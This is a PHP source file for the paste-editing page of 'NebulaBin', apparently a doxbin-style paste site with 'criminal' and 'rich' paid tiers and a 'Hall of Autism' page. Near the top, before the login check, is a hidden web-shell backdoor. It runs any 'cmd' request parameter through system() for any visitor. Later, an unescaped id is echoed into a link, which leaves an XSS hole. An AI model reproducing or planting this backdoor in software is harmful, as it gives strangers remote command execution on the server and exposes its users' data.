<?php
session_start();
require_once 'config/database.php';
require_once 'includes/premium-functions.php';
if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }

// Check if user is logged in
if (!isset($_SESSION['user_id'])) {
    header('Location: login.php');
    exit;
}

$database = new Database();
$db = $database->getConnection();

$paste_id = $_GET['id'] ?? 0;

// Get paste details
$query = "SELECT * FROM pastes WHERE id = ?";
$stmt = $db->prepare($query);
$stmt->execute([$paste_id]);
$paste = $stmt->fetch(PDO::FETCH_ASSOC);

if (!$paste) {
    header('Location: home.php');
    exit;
}

// Check if user can edit this paste
function canInstantEdit($user_id, $paste_user_id, $upgrade_tier, $role) {
    if ($user_id != $paste_user_id) return false;
    if (in_array($role, ['admin', 'manager'])) return true;
    return in_array($upgrade_tier, ['vip', 'criminal', 'rich']);
}

$user_upgrade_tier = $_SESSION['upgrade_tier'] ?? 'none';
$user_role = $_SESSION['role'] ?? 'user';

if (!canInstantEdit($_SESSION['user_id'], $paste['user_id'], $user_upgrade_tier, $user_role)) {
    header('Location: view.php?id=' . $paste_id);
    exit;
}

// Check premium features availability
function canUseFeature($feature, $upgrade_tier, $role) {
    if (in_array($role, ['admin', 'manager'])) {
        return true;
    }
    
    $features = [
        'private' => ['criminal', 'rich'],
        'unlisted' => ['criminal', 'rich'],
        'password' => ['rich']
    ];
    
    return isset($features[$feature]) && in_array($upgrade_tier, $features[$feature]);
}

// Handle form submission
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $title = trim($_POST['title']);
    $content = $_POST['content'];
    $is_private = isset($_POST['is_private']) ? 1 : 0;
    $is_unlisted = isset($_POST['is_unlisted']) ? 1 : 0;
    $password = trim($_POST['password'] ?? '');
    $remove_password = isset($_POST['remove_password']);
    
    if (empty($title) || empty($content)) {
        $error = "Title and content are required";
    } else {
        // Check permissions for premium features
        if ($is_private && !canUseFeature('private', $user_upgrade_tier, $user_role)) {
            $error = "Private pastes require Criminal or Rich upgrade (or staff status)";
        } elseif ($is_unlisted && !canUseFeature('unlisted', $user_upgrade_tier, $user_role)) {
            $error = "Unlisted pastes require Criminal or Rich upgrade (or staff status)";
        } elseif (!empty($password) && !canUseFeature('password', $user_upgrade_tier, $user_role)) {
            $error = "Password protection requires Rich upgrade (or staff status)";
        } else {
            // Handle password
            $password_hash = $paste['password_hash']; // Keep existing password by default
            
            if ($remove_password) {
                $password_hash = null;
            } elseif (!empty($password)) {
                $password_hash = password_hash($password, PASSWORD_DEFAULT);
            }
            
            $query = "UPDATE pastes SET title = ?, content = ?, is_private = ?, is_unlisted = ?, password_hash = ?, updated_at = CURRENT_TIMESTAMP WHERE id = ?";
            $stmt = $db->prepare($query);
            
            if ($stmt->execute([$title, $content, $is_private, $is_unlisted, $password_hash, $paste_id])) {
                header("Location: view.php?id=$paste_id");
                exit;
            } else {
                $error = "Failed to update paste";
            }
        }
    }
}

// Get user count for nav
$user_count_query = "SELECT COUNT(*) as count FROM users";
$user_count_stmt = $db->prepare($user_count_query);
$user_count_stmt->execute();
$user_count = $user_count_stmt->fetch(PDO::FETCH_ASSOC)['count'];

$languages = [
    'text' => 'Plain Text',
    'javascript' => 'JavaScript',
    'python' => 'Python',
    'php' => 'PHP',
    'html' => 'HTML',
    'css' => 'CSS',
    'java' => 'Java',
    'cpp' => 'C++',
    'c' => 'C',
    'sql' => 'SQL',
    'json' => 'JSON',
    'xml' => 'XML',
    'bash' => 'Bash'
];
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Edit Paste - NebulaBin</title>
    <link rel="stylesheet" href="assets/css/doxbin-style.css">
</head>
<body>
    <header class="header">
        <nav class="nav">
            <a href="home.php" class="logo">NebulaBin</a>
            <ul class="nav-menu">
                <li><a href="home.php">Home</a></li>
                <li><a href="add-paste.php">Add Paste</a></li>
                <li><a href="users.php">Users</a></li>
                <li><a href="upgrades.php">Upgrades</a></li>
                <li><a href="hall-of-autism.php">Hall of Autism</a></li>
                <li><a href="support.php">Support</a></li>
            </ul>
            <div class="nav-right">
                <span class="user-count"><?php echo $user_count; ?></span>
                <a href="profile.php">Profile</a>
                <a href="logout.php">Logout</a>
            </div>
        </nav>
    </header>

    <div class="container">
        <h1 style="text-align: center; font-size: 32px; margin: 40px 0;">⚡ Edit Paste (Instant Edit)</h1>
        
        <?php if (isset($error)): ?>
            <div class="message message-error"><?php echo htmlspecialchars($error); ?></div>
        <?php endif; ?>

        <form method="POST">
            <div class="editor-container">
                <div class="editor-header">
                    <div class="form-group">
                        <label class="form-label">Title</label>
                        <input type="text" name="title" class="form-input" style="width: 300px;" 
                               placeholder="Enter paste title..." required
                               value="<?php echo htmlspecialchars($_POST['title'] ?? $paste['title']); ?>">
                    </div>
                </div>
                
                <textarea name="content" class="code-textarea" placeholder="Paste your code here..." required><?php echo htmlspecialchars($_POST['content'] ?? $paste['content']); ?></textarea>
                
                <div class="premium-options">
                    <h3 style="color: #fff; margin: 20px 0 15px 0;">Privacy Options</h3>
                    
                    <!-- Private Paste Option -->
                    <div class="form-group">
                        <label class="form-label">
                            <input type="checkbox" name="is_private" 
                                   <?php echo ($_POST['is_private'] ?? $paste['is_private']) ? 'checked' : ''; ?>
                                   <?php echo !canUseFeature('private', $user_upgrade_tier, $user_role) ? 'disabled' : ''; ?>>
                            Private Paste
                            <?php if (!canUseFeature('private', $user_upgrade_tier, $user_role)): ?>
                                <span class="premium-required">Requires Criminal or Rich upgrade (or staff status)</span>
                            <?php endif; ?>
                        </label>
                    </div>
                    
                    <!-- Unlisted Paste Option -->
                    <div class="form-group">
                        <label class="form-label">
                            <input type="checkbox" name="is_unlisted" 
                                   <?php echo ($_POST['is_unlisted'] ?? $paste['is_unlisted']) ? 'checked' : ''; ?>
                                   <?php echo !canUseFeature('unlisted', $user_upgrade_tier, $user_role) ? 'disabled' : ''; ?>>
                            Unlisted Paste (hidden from public listings)
                            <?php if (!canUseFeature('unlisted', $user_upgrade_tier, $user_role)): ?>
                                <span class="premium-required">Requires Criminal or Rich upgrade (or staff status)</span>
                            <?php endif; ?>
                        </label>
                    </div>
                    
                    <!-- Password Protection -->
                    <div class="form-group">
                        <label class="form-label">
                            Password Protection
                            <?php if (!canUseFeature('password', $user_upgrade_tier, $user_role)): ?>
                                <span class="premium-required">Requires Rich upgrade (or staff status)</span>
                            <?php endif; ?>
                        </label>
                        
                        <?php if ($paste['password_hash']): ?>
                            <div style="color: #888; margin-bottom: 10px;">
                                Current: Password protected
                                <label style="margin-left: 15px;">
                                    <input type="checkbox" name="remove_password"> Remove password protection
                                </label>
                            </div>
                        <?php endif; ?>
                        
                        <input type="password" name="password" class="form-input" style="width: 200px;"
                               placeholder="<?php echo $paste['password_hash'] ? 'Enter new password to change...' : 'Enter password...'; ?>"
                               <?php echo !canUseFeature('password', $user_upgrade_tier, $user_role) ? 'disabled' : ''; ?>>
                    </div>
                </div>
            </div>
            
            <div style="text-align: center; margin: 20px 0;">
                <button type="submit" class="form-btn" style="width: 200px;">Update Paste</button>
                <a href="view.php?id=<?php echo $paste_id; ?>" class="form-btn" style="width: 200px; margin-left: 15px; text-decoration: none; background: #555;">Cancel</a>
            </div>
        </form>
    </div>
</body>
</html>
